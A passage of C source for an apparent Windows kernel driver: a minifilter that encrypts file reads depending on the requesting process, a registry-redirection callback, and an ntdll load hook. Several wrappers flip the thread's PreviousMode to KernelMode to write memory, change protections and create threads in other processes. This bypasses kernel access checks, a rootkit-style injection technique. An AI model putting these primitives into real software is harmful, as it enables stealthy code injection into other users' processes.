			SC_LOCK(pStreamCtx, &OldIrql);
			pStreamCtx->RefCount++;
			pStreamCtx->uAccess = uDesiredAccess;
			SC_UNLOCK(pStreamCtx, OldIrql);
			//            DbgPrint("[PostCreate] has found RefCount:%d filename:%wZ\n", pStreamCtx->RefCount,&pStreamCtx->FileName);
//            LOG(LOGFL_INFO,("[PostCreate] has     found RefCount:%d filename:%wZ\n",pStreamCtx->RefCount, &pStreamCtx->FileName));
			__leave;
		}

		//init new created stream context
		SC_LOCK(pStreamCtx, &OldIrql);
		pStreamCtx->RefCount++;
		pStreamCtx->uEncrypteType = pCmdData->uType;
		pStreamCtx->uAccess = uDesiredAccess;
		LOG(LOGFL_INFO, ("[PostCreate] has not found RefCount:%d filename:%wZ\n", pStreamCtx->RefCount,&pStreamCtx->FileName));
		//pStreamCtx->aes_ctr_ctx = NULL ;
		SC_UNLOCK(pStreamCtx, OldIrql);
		//Cc_ClearFileCache(FltObjects->FileObject, TRUE, NULL, 0); // flush and purge cache
	}
	finally
	{
		if (NULL != pfNameInfo) FltReleaseFileNameInformation(pfNameInfo);
		if (NULL != pStreamCtx) FltReleaseContext(pStreamCtx);
	}

	return FLT_POSTOP_FINISHED_PROCESSING;
}

BOOLEAN GetNameByUnicodeString(PUNICODE_STRING pSrc, WCHAR name[])
{

	if (pSrc->Length < 512)
	{
		WCHAR *pfind = NULL;
		pfind = wcsrchr(pSrc->Buffer, L'\\');
		if (pfind)
		{
			pfind++;
			wcscpy(name, pfind);
//            DbgPrint("[GetNameByUnicodeString] %ws", pfind);
			return TRUE;
		}
	}
	return FALSE;
}

/*************************************************************************
	MiniFilter callback routines.
*************************************************************************/
FLT_PREOP_CALLBACK_STATUS PreRead(
	IN OUT PFLT_CALLBACK_DATA Data,
	IN PCFLT_RELATED_OBJECTS FltObjects,
	OUT PVOID *CompletionContext)
{
	PFLT_IO_PARAMETER_BLOCK iopb = Data->Iopb;
	FLT_PREOP_CALLBACK_STATUS retValue = FLT_PREOP_SUCCESS_NO_CALLBACK;
	PVOID newBuf = NULL;
	PMDL newMdl = NULL;
	PVOLUME_CONTEXT volCtx = NULL;
	PSTREAM_CONTEXT pStreamCtx = NULL;
	PPRE_2_POST_CONTEXT p2pCtx = NULL;
	NTSTATUS status;
	ULONG readLen = iopb->Parameters.Read.Length;
	PFLT_FILE_NAME_INFORMATION nameInfo;
	WCHAR filename[216] = { 0 };
	ULONG uRet = 0;
	try
	{

		//get volume context
		status = FltGetVolumeContext(FltObjects->Filter, FltObjects->Volume, &volCtx);
		if (!NT_SUCCESS(status)) __leave;

		//get per-stream context, not used presently
		status = Ctx_FindOrCreateStreamContext(Data, FltObjects, FALSE, &pStreamCtx, NULL);
		if (!NT_SUCCESS(status)) __leave;
		//fast io path, disallow it, this will lead to an equivalent irp request coming in
		if (FLT_IS_FASTIO_OPERATION(Data))
		{
			// disallow fast io path
			LOG(LOGFL_INFO, ("[PreRead] FLT_PREOP_DISALLOW_FASTIO"));
			retValue = FLT_PREOP_DISALLOW_FASTIO;
			__leave;
		}

		//cached io irp path
		if (!(Data->Iopb->IrpFlags & (IRP_NOCACHE | IRP_PAGING_IO | IRP_SYNCHRONOUS_PAGING_IO)))
		{
			LOG(LOGFL_INFO, ("[PreRead] This is Not IRP_NOCACHE IRP_PAGING_IO IRP_SYNCHRONOUS_PAGING_IO:%x",Data->Iopb->IrpFlags));
			__leave;
		}

		// read length is zero, pass
		if (readLen == 0) __leave;

		//
		//  If this is a non-cached I/O we need to round the length up to the
		//  sector size for this device.  We must do this because the file
		//  systems do this and we need to make sure our buffer is as big
		//  as they are expecting.
		//

		if (FlagOn(IRP_NOCACHE, iopb->IrpFlags))
		{

			readLen = (ULONG)ROUND_TO_SIZE(readLen, volCtx->SectorSize);
		}

		//
		//  Allocate nonPaged memory for the buffer we are swapping to.
		//  If we fail to get the memory, just don't swap buffers on this
		//  operation.
		//

		newBuf = ExAllocatePoolWithTag(NonPagedPool, readLen, BUFFER_SWAP_TAG);
		if (newBuf == NULL)
		{
			leave;
		}

		//
		//  We only need to build a MDL for IRP operations.  We don't need to
		//  do this for a FASTIO operation since the FASTIO interface has no
		//  parameter for passing the MDL to the file system.
		//
		RtlZeroMemory(newBuf, readLen);
		if (FlagOn(Data->Flags, FLTFL_CALLBACK_DATA_IRP_OPERATION))
		{

			//
			//  Allocate a MDL for the new allocated memory.  If we fail
			//  the MDL allocation then we won't swap buffer for this operation
			//

			newMdl = IoAllocateMdl(newBuf, readLen, TRUE, FALSE, NULL);
			if (newMdl == NULL)
			{
				leave;
			}

			//
			//  setup the MDL for the non-paged pool we just allocated
			//

			MmBuildMdlForNonPagedPool(newMdl);
		}

		//
		//  We are ready to swap buffers, get a pre2Post context structure.
		//  We need it to pass the volume context and the allocate memory
		//  buffer to the post operation callback.
		//

		p2pCtx = ExAllocateFromNPagedLookasideList(&Pre2PostContextList);

		if (p2pCtx == NULL)
		{
			//            kprintf("[PreRead]:%wZ Failed to allocate pre2Post context structure\n",&volCtx->Name);
			leave;
		}
		//
		//  Update the buffer pointers and MDL address, mark we have changed
		//  something.
		//
		LOG(LOGFL_INFO, ("[PreRead]  p2pCtx:%p newBuf:%p newMdl:%p pStreamCtx:%p",p2pCtx,newBuf,newMdl,pStreamCtx));
		iopb->Parameters.Read.ReadBuffer = newBuf;
		iopb->Parameters.Read.MdlAddress = newMdl;
		FltSetCallbackDataDirty(Data);
		//
		//  Pass state to our post-operation callback.
		//
		p2pCtx->SwappedBuffer = newBuf;
		p2pCtx->VolCtx = volCtx;
		p2pCtx->pStreamCtx = pStreamCtx;
		*CompletionContext = p2pCtx;

		//
		//  Return we want a post-operation callback
		//

		retValue = FLT_PREOP_SUCCESS_WITH_CALLBACK;
	}
	finally{

		//
		//  If we don't want a post-operation callback, then cleanup state.
		//
		if (retValue != FLT_PREOP_SUCCESS_WITH_CALLBACK)
		{
			if (newBuf != NULL)
			{
				ExFreePool(newBuf);
			}
			if (newMdl != NULL)
			{
				IoFreeMdl(newMdl);
			}
			if (volCtx != NULL)
			{
				FltReleaseContext(volCtx);
			}
			if (NULL != pStreamCtx)
			{
				FltReleaseContext(pStreamCtx);
			}
		}
	}

	return retValue;
}

FLT_POSTOP_CALLBACK_STATUS PostRead(
	IN OUT PFLT_CALLBACK_DATA Data,
	IN PCFLT_RELATED_OBJECTS FltObjects,
	IN PVOID CompletionContext,
	IN FLT_POST_OPERATION_FLAGS Flags)
{
	PVOID origBuf;
	PFLT_IO_PARAMETER_BLOCK iopb = Data->Iopb;
	FLT_POSTOP_CALLBACK_STATUS retValue = FLT_POSTOP_FINISHED_PROCESSING;
	BOOLEAN cleanupAllocatedBuffer = TRUE;
	PPRE_2_POST_CONTEXT p2pCtx = (PPRE_2_POST_CONTEXT)CompletionContext;
	ULONG pid = FltGetRequestorProcessId(Data);


	//  This system won't draining an operation with swapped buffers, verify
	//  the draining flag is not set.
	//
	ASSERT(!FlagOn(Flags, FLTFL_POST_OPERATION_DRAINING));
	try
	{
		//
		//  If the operation failed or the count is zero, there is no data to
		//  copy so just return now.
		//
		if (!NT_SUCCESS(Data->IoStatus.Status) || (Data->IoStatus.Information == 0))
		{
			leave;
		}

		//
		//  We need to copy the read data back into the users buffer.  Note
		//  that the parameters passed in are for the users original buffers
		//  not our swapped buffers.
		//
		if (iopb->Parameters.Read.MdlAddress != NULL)
		{

			origBuf = MmGetSystemAddressForMdlSafe(iopb->Parameters.Read.MdlAddress, NormalPagePriority);
			if (origBuf == NULL)
			{
				Data->IoStatus.Status = STATUS_INSUFFICIENT_RESOURCES;
				Data->IoStatus.Information = 0;
				leave;
			}
			
			LOG(LOGFL_INFO, ("[PostRead]  MmGetSystemAddressForMdlSafe Len:%d file:%ws",Data->IoStatus.Information,p2pCtx->pStreamCtx->FileName.Buffer));


		} else if (FlagOn(Data->Flags, FLTFL_CALLBACK_DATA_SYSTEM_BUFFER) || FlagOn(Data->Flags, FLTFL_CALLBACK_DATA_FAST_IO_OPERATION))
		{
			origBuf = iopb->Parameters.Read.ReadBuffer;

			LOG(LOGFL_INFO, ("[PostRead]  FLTFL_CALLBACK_DATA_SYSTEM_BUFFER | FLTFL_CALLBACK_DATA_FAST_IO_OPERATION Len:%d file:%ws",Data->IoStatus.Information,p2pCtx->pStreamCtx->FileName.Buffer));

		} else
		{
			if (FltDoCompletionProcessingWhenSafe(Data, FltObjects, CompletionContext, Flags, PostReadWhenSafe, &retValue))
			{
				LOG(LOGFL_INFO, ("[PostRead]  call FltDoCompletionProcessingWhenSafe Len:%d file:%ws",Data->IoStatus.Information,p2pCtx->pStreamCtx->FileName.Buffer));
				cleanupAllocatedBuffer = FALSE;
			} else
			{
				//                DbgPrint("[PostRead] call else");
				Data->IoStatus.Status = STATUS_UNSUCCESSFUL;
				Data->IoStatus.Information = 0;
			}

			leave;
		}

		//
		//  We either have a system buffer or this is a fastio operation
		//  so we are in the proper context.  Copy the data handling an
		//  exception.
		//
		LOG(LOGFL_INFO, ("[PostRead] pid:%d p2pCtx:%p SwappedBuffer:%p pStreamCtx:%p pMdl:%p  Len:%d file:%ws",pid,p2pCtx,p2pCtx->SwappedBuffer,p2pCtx->pStreamCtx,p2pCtx->pMdl,
						 Data->IoStatus.Information,p2pCtx->pStreamCtx->FileName.Buffer));
		try
		{

			PUCHAR   pOrigBuf = (PUCHAR)origBuf;
			//除去explorer 全加密
			if (p2pCtx->pStreamCtx->uEncrypteType == 1)
			{
				LOG(LOGFL_INFO, ("[PostRead] encrypte len:%d file:%ws",Data->IoStatus.Information,p2pCtx->pStreamCtx->FileName.Buffer));
				EncodeBuffer(p2pCtx->SwappedBuffer, origBuf, Data->IoStatus.Information, TRUE);
			} else if (p2pCtx->pStreamCtx->uEncrypteType == 2)
			{

				WCHAR exename[512] = { 0 };
				PEPROCESS ProcessObj = FltGetRequestorProcess(Data);
				BOOLEAN bGetName = GetProcessNameByObj(ProcessObj, exename);
				if (_wcsicmp(exename, g_HexConfig[4]) == 0 || _wcsicmp(exename, g_HexConfig[5]) == 0)
				{
					LOG(LOGFL_INFO, ("[PostRead] pid:%d exename:%ws filename:%ws",pid,exename,p2pCtx->pStreamCtx->FileName.Buffer));
					EncodeBuffer(p2pCtx->SwappedBuffer, origBuf, Data->IoStatus.Information, FALSE);
				} else
				{
					EncodeBuffer(p2pCtx->SwappedBuffer, origBuf, Data->IoStatus.Information, TRUE);
				}


			}
		}

		__except(EXCEPTION_EXECUTE_HANDLER)
		{
			ULONG code = GetExceptionCode();
		}

//        EncodeBuffer(Data, p2pCtx, origBuf);
	}
	finally{

		//
		//  If we are supposed to, cleanup the allocated memory and release
		//  the volume context.  The freeing of the MDL (if there is one) is
		//  handled by FltMgr.
		//
		//        DbgPrint("[PostRead] finally cleanupAllocatedBuffer:%d",cleanupAllocatedBuffer);
		if (cleanupAllocatedBuffer)
		{

			ExFreePool(p2pCtx->SwappedBuffer);
			FltReleaseContext(p2pCtx->VolCtx);
			FltReleaseContext(p2pCtx->pStreamCtx);
			ExFreeToNPagedLookasideList(&Pre2PostContextList, p2pCtx);
		}
	}

	return retValue;
}

/**
 * [PostReadWhenSafe description]
 * @Author   zzc
 * @DateTime 2019年6月18日T6:59:43+0800
 * @param    Data                     [Pointer to the filter callbackData that is passed to us]
 * @param    FltObjects               [Pointer to the FLT_RELATED_OBJECTS data structure containing opaque handles to this filter, instance, its associated volume and file object]
 * @param    CompletionContext        [Contains state from our PreOperation callback]
 * @param    Flags                    [Denotes whether the completion is successful or is being drained]
 * @return                            [FLT_POSTOP_FINISHED_PROCESSING - This is always returned.]
 */
FLT_POSTOP_CALLBACK_STATUS PostReadWhenSafe(IN OUT PFLT_CALLBACK_DATA Data, IN PCFLT_RELATED_OBJECTS FltObjects, IN PVOID CompletionContext, IN FLT_POST_OPERATION_FLAGS Flags)
{
	PFLT_IO_PARAMETER_BLOCK iopb = Data->Iopb;
	PPRE_2_POST_CONTEXT p2pCtx = CompletionContext;
	PVOID origBuf;
	NTSTATUS status;

	UNREFERENCED_PARAMETER(FltObjects);
	UNREFERENCED_PARAMETER(Flags);
	ASSERT(Data->IoStatus.Information != 0);
	status = FltLockUserBuffer(Data);

	if (!NT_SUCCESS(status))
	{

		//
		//  If we can't lock the buffer, fail the operation
		//
		Data->IoStatus.Status = status;
		Data->IoStatus.Information = 0;
	} else
	{
		origBuf = MmGetSystemAddressForMdlSafe(iopb->Parameters.Read.MdlAddress, NormalPagePriority);
		if (origBuf == NULL)
		{

			//
			//  If we couldn't get a SYSTEM buffer address, fail the operation
			//
			Data->IoStatus.Status = STATUS_INSUFFICIENT_RESOURCES;
			Data->IoStatus.Information = 0;
		} else
		{

			ULONG pid = FltGetRequestorProcessId(Data);
			LOG(LOGFL_INFO, ("[PostReadWhenSafe] pid:%d Len:%d file:%ws",pid,Data->IoStatus.Information,p2pCtx->pStreamCtx->FileName.Buffer));
			try
			{

				PUCHAR	 pOrigBuf = (PUCHAR)origBuf;
				//除去explorer 全加密
				if (p2pCtx->pStreamCtx->uEncrypteType == 1)
				{
					LOG(LOGFL_INFO, ("[PostReadWhenSafe] encrypte len:%d file:%ws",Data->IoStatus.Information,p2pCtx->pStreamCtx->FileName.Buffer));
					EncodeBuffer(p2pCtx->SwappedBuffer, origBuf, Data->IoStatus.Information, TRUE);
				} else if (p2pCtx->pStreamCtx->uEncrypteType == 2)
				{

					WCHAR exename[512] = { 0 };
					PEPROCESS ProcessObj = FltGetRequestorProcess(Data);
					BOOLEAN bGetName = GetProcessNameByObj(ProcessObj, exename);
					if (_wcsicmp(exename, g_HexConfig[4]) == 0 || _wcsicmp(exename, g_HexConfig[5]) == 0)
					{
						LOG(LOGFL_INFO, ("[PostReadWhenSafe] pid:%d exename:%ws filename:%ws",pid,exename,p2pCtx->pStreamCtx->FileName.Buffer));
						EncodeBuffer(p2pCtx->SwappedBuffer, origBuf, Data->IoStatus.Information, FALSE);
					} else
					{
						EncodeBuffer(p2pCtx->SwappedBuffer, origBuf, Data->IoStatus.Information, TRUE);
					}


				}
			}
			__except(EXCEPTION_EXECUTE_HANDLER)
			{
				ULONG code = GetExceptionCode();
			}



//            EncodeBuffer(Data, p2pCtx, origBuf);
			//DbgPrint("[PostReadWhenSafe] %s",origBuf);
			//memset( p2pCtx->SwappedBuffer, 0x61, Data->IoStatus.Information);
			//RtlCopyMemory(origBuf, p2pCtx->SwappedBuffer, Data->IoStatus.Information);
		}
	}

	//
	//  Free allocated memory and release the volume context
	//
	ExFreePool(p2pCtx->SwappedBuffer);
	FltReleaseContext(p2pCtx->VolCtx);
	FltReleaseContext(p2pCtx->pStreamCtx);
	ExFreeToNPagedLookasideList(&Pre2PostContextList, p2pCtx);

	return FLT_POSTOP_FINISHED_PROCESSING;
}

DWORD_PTR GetSystemRoutineAddress(WCHAR *szFunCtionAName)
{
	UNICODE_STRING FsRtlLegalAnsiCharacterArray_String;
	RtlInitUnicodeString(&FsRtlLegalAnsiCharacterArray_String, szFunCtionAName);
	return (DWORD_PTR)MmGetSystemRoutineAddress(&FsRtlLegalAnsiCharacterArray_String);
}

/**
 * [RegCallBack description]
 * @Author   zzc
 * @DateTime 2019年6月18日T6:53:38+0800
 * @param    CallbackContext          [上下文]
 * @param    Argument1                [操作类型（只是操作编号，不是指针）]
 * @param    Argument2                [操作详细信息的结构体指针]
 * @return                            [状态值]
 */
NTSTATUS RegCallBack(PVOID CallbackContext, PVOID Argument1, PVOID Argument2)
{
	NTSTATUS status = STATUS_SUCCESS;
	UNICODE_STRING ustrRegPath = { 0 };
	LONG lOperateType = (LONG)Argument1;
	LONG NotifyClass = (LONG)Argument1;
	UNREFERENCED_PARAMETER(CallbackContext);
	// 判断操作
	switch (lOperateType)
	{
	case RegNtPreOpenKey:
	case RegNtPreCreateKeyEx:
	case RegNtPreOpenKeyEx:
		{
			PREG_CREATE_KEY_INFORMATION KeyInfo = (PREG_CREATE_KEY_INFORMATION)Argument2;
			WCHAR exename[216] = { 0 };
			WCHAR PathReg[512] = { 0 };
			WCHAR Key[512] = { 0 };
			PUNICODE_STRING RootKeyName = NULL;
			UNICODE_STRING registryPath;
			BOOLEAN  bFind = FALSE;
			BOOLEAN  bGetName = FALSE;
			PUNICODE_STRING pCommonStr = NULL;
			NTSTATUS st = STATUS_UNSUCCESSFUL;
			if (MmIsAddressValid(KeyInfo) && MmIsAddressValid(KeyInfo->CompleteName))
			{
				st = LfGetObjectName(KeyInfo->RootObject, &RootKeyName, KeyInfo->CompleteName);
				if (NT_SUCCESS(st))
				{
					WCHAR *pfind = NULL;
					if (RootKeyName)
					{
						RtlCopyMemory(PathReg, RootKeyName->Buffer, RootKeyName->Length);
						kfree(RootKeyName);
					} else
					{
						RtlCopyMemory(PathReg, KeyInfo->CompleteName->Buffer, KeyInfo->CompleteName->Length);
					}
					pfind = wcsrchr(PathReg, L'\\');
					if (pfind)
					{
						pfind++;

						if (_wcsicmp(pfind, g_HexConfig[8]) == 0)
						{
							if (wcsstr(PathReg, g_HexConfig[7]))
							{
								BOOLEAN bGetExeName = FALSE;
								bGetExeName = GetProcessNameByObj(PsGetCurrentProcess(), exename);
								if (bGetExeName && _wcsicmp(g_HexConfig[4], exename) != 0)
								{
									BOOLEAN bRedirect = TRUE;
									ULONG udesire = KEY_ALL_ACCESS | KEY_WOW64_64KEY;
									if (KeyInfo->DesiredAccess == KEY_ALL_ACCESS || KeyInfo->DesiredAccess == udesire)
									{
										if (KeyInfo->GrantedAccess == 0 && KeyInfo->CreateOptions == 0) bRedirect = FALSE;
										else bRedirect = TRUE;
									} else bRedirect = TRUE;
									if (bRedirect == TRUE)
									{
										LOG(LOGFL_INFO, ("[RegCallBack] PathReg:%ws exename:%ws Redirec",PathReg,exename));
										status = RedirectReg(KeyInfo, NotifyClass, g_HexConfig[6]);
									} else
									{
										LOG(LOGFL_INFO, ("[RegCallBack] exename:%ws DesiredAccess:%x  GrantedAccess:%x  Disposition:%x CreateOptions:%x",
														 exename, KeyInfo->DesiredAccess, KeyInfo->GrantedAccess, KeyInfo->Disposition, KeyInfo->CreateOptions));
									}
								} else LOG(LOGFL_INFO, ("[RegCallBack] PathReg:%ws exename:%ws is not Redirec",PathReg,exename));

							}
						} else if (_wcsicmp(pfind, g_HexConfig[9]) == 0)
						{
							BOOLEAN bGetExeName = FALSE;
							if (wcsstr(PathReg, g_HexConfig[10]) != NULL)
							{
								bGetExeName = GetProcessNameByObj(PsGetCurrentProcess(), exename);
								if (bGetExeName && _wcsicmp(g_HexConfig[11], exename) != 0)
								{
									status = RedirectReg(KeyInfo, NotifyClass, g_HexConfig[6]);
								}
							}

						}

					}

				}

			}
		}
	}
	return status;
}



NTSTATUS SetRegisterCallback()
{
	NTSTATUS status = CmRegisterCallback(RegCallBack, NULL, &g_liRegCookie);

	if (!NT_SUCCESS(status))
	{
		DbgPrint("CmRegisterCallback", status);
		g_liRegCookie.QuadPart = 0;
		return status;
	}

	return status;
}

// 删除回调函数
VOID RemoveRegisterCallback()
{
	if (0 < g_liRegCookie.QuadPart)
	{
		CmUnRegisterCallback(g_liRegCookie);

	}
}

NTSTATUS BBSearchPattern(IN PUCHAR pattern, IN UCHAR wildcard, IN ULONG_PTR len, IN const VOID *base, IN ULONG_PTR size, OUT PVOID *ppFound)
{
	ULONG_PTR i, j;

	if (ppFound == NULL || pattern == NULL || base == NULL) return STATUS_INVALID_PARAMETER;

	for (i = 0; i < size - len; i++)
	{
		BOOLEAN found = TRUE;

		for (j = 0; j < len; j++)
		{
			if (pattern[j] != wildcard && pattern[j] != ((PUCHAR)base)[i + j])
			{
				found = FALSE;
				break;
			}
		}

		if (found != FALSE)
		{
			*ppFound = (PUCHAR)base + i;
			return STATUS_SUCCESS;
		}
	}

	return STATUS_NOT_FOUND;
}

NTSTATUS NTAPI NewNtWriteVirtualMemory(IN HANDLE ProcessHandle, IN PVOID BaseAddress, IN PVOID Buffer, IN ULONG BufferLength, OUT PULONG ReturnLength OPTIONAL)
{
	TYPE_ZwWriteVirtualMemory pfnNtWriteVirtualMemory = NtWriteVirtualMemory;
	NTSTATUS status = STATUS_UNSUCCESSFUL;
	PVOID fnExGetPreviousMode = (PVOID)ExGetPreviousMode;
	PVOID pFoundPattern = NULL;
	UCHAR PreviousModePattern[] = "\x00\x00\xC3";
	ULONG PrevMode = 0;
	PrevMode = 0;

	if (pfnNtWriteVirtualMemory)
	{
		if (g_mode)
		{
			PUCHAR pPrevMode = (PUCHAR)PsGetCurrentThread() + g_mode;
			UCHAR prevMode = *pPrevMode;
			*pPrevMode = KernelMode;
			status = pfnNtWriteVirtualMemory(ProcessHandle, BaseAddress, Buffer, BufferLength, ReturnLength);
			*pPrevMode = prevMode;
		} else
		{
			if (NT_SUCCESS(BBSearchPattern(PreviousModePattern, 0xCC, sizeof(PreviousModePattern) - 1, fnExGetPreviousMode, 32, &pFoundPattern)))
			{
				PUCHAR pPrevMode = (PUCHAR)PsGetCurrentThread() + *(ULONG *)((PUCHAR)pFoundPattern - 2);
				UCHAR prevMode = *pPrevMode;
				*pPrevMode = KernelMode;
				status = pfnNtWriteVirtualMemory(ProcessHandle, BaseAddress, Buffer, BufferLength, ReturnLength);
				*pPrevMode = prevMode;
			}
		}
	} else status = STATUS_NOT_FOUND;

	return status;
}

NTSTATUS NTAPI NewNtCreateThreadEx(PHANDLE hThread, ACCESS_MASK DesiredAccess, PVOID ObjectAttributes, HANDLE ProcessHandle, PVOID lpStartAddress, PVOID lpParameter,
								   ULONG Flags, SIZE_T StackZeroBits, SIZE_T SizeOfStackCommit, SIZE_T SizeOfStackReserve, PVOID lpBytesBuffer)
{
	NTSTATUS status = STATUS_SUCCESS;
	TYPE_NtCreateThreadEx pfnNtCreateThreadEx = NtCreateThreadEx;
	PVOID fnExGetPreviousMode = (PVOID)ExGetPreviousMode;
	PVOID pFoundPattern = NULL;
	UCHAR PreviousModePattern[] = "\x00\x00\xC3";
	ULONG PrevMode = 0;

	if (pfnNtCreateThreadEx)
	{
		if (g_mode)
		{
			PUCHAR pPrevMode = (PUCHAR)PsGetCurrentThread() + g_mode;
			UCHAR prevMode = *pPrevMode;
			*pPrevMode = KernelMode;
			status = NtCreateThreadEx(hThread, DesiredAccess, ObjectAttributes, ProcessHandle, lpStartAddress, lpParameter, Flags, StackZeroBits, SizeOfStackCommit, SizeOfStackReserve, lpBytesBuffer);
			*pPrevMode = prevMode;
		} else
		{
			if (NT_SUCCESS(BBSearchPattern(PreviousModePattern, 0xCC, sizeof(PreviousModePattern) - 1, fnExGetPreviousMode, 32, &pFoundPattern)))
			{
				PUCHAR pPrevMode = (PUCHAR)PsGetCurrentThread() + *(ULONG *)((PUCHAR)pFoundPattern - 2);
				UCHAR prevMode = *pPrevMode;
				*pPrevMode = KernelMode;
				status = pfnNtCreateThreadEx(hThread, DesiredAccess, ObjectAttributes, ProcessHandle, lpStartAddress, lpParameter, Flags, StackZeroBits, SizeOfStackCommit, SizeOfStackReserve, lpBytesBuffer);
				*pPrevMode = prevMode;
			}
		}
	} else status = STATUS_NOT_FOUND;

	return status;
}

NTSTATUS NTAPI NewNtProtectVirtualMemory(IN HANDLE ProcessHandle, IN PVOID *BaseAddress, IN SIZE_T *NumberOfBytesToProtect, IN ULONG NewAccessProtection, OUT PULONG OldAccessProtection)
{
	NTSTATUS status = STATUS_UNSUCCESSFUL;
	TYPE_ZwProtectVirtualMemory pfnNtProtectVirtualMemory = NtProtectVirtualMemory;
	PVOID fnExGetPreviousMode = (PVOID)ExGetPreviousMode;
	PVOID pFoundPattern = NULL;
	UCHAR PreviousModePattern[] = "\x00\x00\xC3";
	ULONG PrevMode = 0;

	if (pfnNtProtectVirtualMemory)
	{
		if (g_mode)
		{
			PUCHAR pPrevMode = (PUCHAR)PsGetCurrentThread() + g_mode;
			UCHAR prevMode = *pPrevMode;
			*pPrevMode = KernelMode;
			status = pfnNtProtectVirtualMemory(ProcessHandle, BaseAddress, NumberOfBytesToProtect, NewAccessProtection, OldAccessProtection);
			*pPrevMode = prevMode;
		} else
		{
			if (NT_SUCCESS(BBSearchPattern(PreviousModePattern, 0xCC, sizeof(PreviousModePattern) - 1, fnExGetPreviousMode, 32, &pFoundPattern)))
			{
				PUCHAR pPrevMode = (PUCHAR)PsGetCurrentThread() + *(ULONG *)((PUCHAR)pFoundPattern - 2);
				UCHAR prevMode = *pPrevMode;
				*pPrevMode = KernelMode;
				status = pfnNtProtectVirtualMemory(ProcessHandle, BaseAddress, NumberOfBytesToProtect, NewAccessProtection, OldAccessProtection);
				*pPrevMode = prevMode;
			}
		}
	} else status = STATUS_NOT_FOUND;

	return status;
}

BOOLEAN IsX64Module(IN PVOID pBase)
{
	PIMAGE_DOS_HEADER pDosHdr = (PIMAGE_DOS_HEADER)pBase;
	PIMAGE_NT_HEADERS32 pNtHdr32 = NULL;
	PIMAGE_NT_HEADERS64 pNtHdr64 = NULL;
	PIMAGE_EXPORT_DIRECTORY pExport = NULL;
	ULONG expSize = 0;
	ULONG_PTR pAddress = 0;
	ASSERT(pBase != NULL);

	if (pBase == NULL) return FALSE;

	/// Not a PE file
	if (pDosHdr->e_magic != IMAGE_DOS_SIGNATURE) return FALSE;

	pNtHdr32 = (PIMAGE_NT_HEADERS32)((PUCHAR)pBase + pDosHdr->e_lfanew);
	pNtHdr64 = (PIMAGE_NT_HEADERS64)((PUCHAR)pBase + pDosHdr->e_lfanew);

	// Not a PE file
	if (pNtHdr32->Signature != IMAGE_NT_SIGNATURE) return FALSE;

	// 64 bit image
	if (pNtHdr32->OptionalHeader.Magic == IMAGE_NT_OPTIONAL_HDR64_MAGIC)
	{
		return TRUE;
	}

	return FALSE;
}

PVOID GetProcAddress(IN PVOID pBase, IN PCCHAR name_ord)
{
	PIMAGE_DOS_HEADER pDosHdr = (PIMAGE_DOS_HEADER)pBase;
	PIMAGE_NT_HEADERS32 pNtHdr32 = NULL;
	PIMAGE_NT_HEADERS64 pNtHdr64 = NULL;
	PIMAGE_EXPORT_DIRECTORY pExport = NULL;
	ULONG expSize = 0;
	ULONG_PTR pAddress = 0;
	PUSHORT pAddressOfOrds = NULL;
	PULONG pAddressOfNames = NULL;
	PULONG pAddressOfFuncs = NULL;
	ULONG i = 0;
	ASSERT(pBase != NULL);

	if (pBase == NULL) return NULL;

	/// Not a PE file
	if (pDosHdr->e_magic != IMAGE_DOS_SIGNATURE) return NULL;

	pNtHdr32 = (PIMAGE_NT_HEADERS32)((PUCHAR)pBase + pDosHdr->e_lfanew);
	pNtHdr64 = (PIMAGE_NT_HEADERS64)((PUCHAR)pBase + pDosHdr->e_lfanew);

	// Not a PE file
	if (pNtHdr32->Signature != IMAGE_NT_SIGNATURE) return NULL;

	// 64 bit image
	if (pNtHdr32->OptionalHeader.Magic == IMAGE_NT_OPTIONAL_HDR64_MAGIC)
	{
		pExport = (PIMAGE_EXPORT_DIRECTORY)(pNtHdr64->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress + (ULONG_PTR)pBase);
		expSize = pNtHdr64->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].Size;
	}
	// 32 bit image
	else
	{
		pExport = (PIMAGE_EXPORT_DIRECTORY)(pNtHdr32->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress + (ULONG_PTR)pBase);
		expSize = pNtHdr32->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].Size;
	}

	pAddressOfOrds = (PUSHORT)(pExport->AddressOfNameOrdinals + (ULONG_PTR)pBase);
	pAddressOfNames = (PULONG)(pExport->AddressOfNames + (ULONG_PTR)pBase);
	pAddressOfFuncs = (PULONG)(pExport->AddressOfFunctions + (ULONG_PTR)pBase);

	for (i = 0; i < pExport->NumberOfFunctions; ++i)
	{
		USHORT OrdIndex = 0xFFFF;
		PCHAR pName = NULL;

		// Find by index
		if ((ULONG_PTR)name_ord <= 0xFFFF)
		{
			OrdIndex = (USHORT)i;
		}
		// Find by name
		else if ((ULONG_PTR)name_ord > 0xFFFF && i < pExport->NumberOfNames)
		{
			pName = (PCHAR)(pAddressOfNames[i] + (ULONG_PTR)pBase);
			OrdIndex = pAddressOfOrds[i];
		}
		// Weird params
		else return NULL;

		if (((ULONG_PTR)name_ord <= 0xFFFF && (USHORT)((ULONG_PTR)name_ord) == OrdIndex + pExport->Base) ||
			((ULONG_PTR)name_ord > 0xFFFF && strcmp(pName, name_ord) == 0))
		{
			pAddress = pAddressOfFuncs[OrdIndex] + (ULONG_PTR)pBase;
			break;
		}
	}

	return (PVOID)pAddress;
}

VOID ImageNotify(PUNICODE_STRING FullImageName, HANDLE ProcessId, PIMAGE_INFO ImageInfo)
{

	PEPROCESS ProcessObj = NULL;
	PPEB pPEB = NULL;
	NTSTATUS st = STATUS_UNSUCCESSFUL;
	NTSTATUS status;
	UCHAR *pData = NULL;
	wchar_t *pfind = NULL;
	WCHAR pTempBuf[512] = { 0 };
	WCHAR CommandLine[1024] = { 0 };
	WCHAR exename[216] = { 0 };
	int i = 0;
	BOOLEAN bGet = FALSE;
	BOOLEAN bFindExe = NULL;

	if (ProcessId == 0)
	{
		//DbgPrint("ProcessId：%x FullImageName:%wZ  ",ProcessId,FullImageName);
		goto fun_ret;
	}

	if (FullImageName == NULL || MmIsAddressValid(FullImageName) == FALSE || FullImageName->Length > 512)
	{
		goto fun_ret;
	}
	RtlCopyMemory(pTempBuf, FullImageName->Buffer, FullImageName->Length);
	pfind = wcsrchr(pTempBuf, L'\\');

	if (pfind == NULL) goto fun_ret;
	++pfind;
	if (_wcsicmp(pfind, L"ntdll.dll") == 0)
	{
		InitGlobeFunc(ImageInfo);
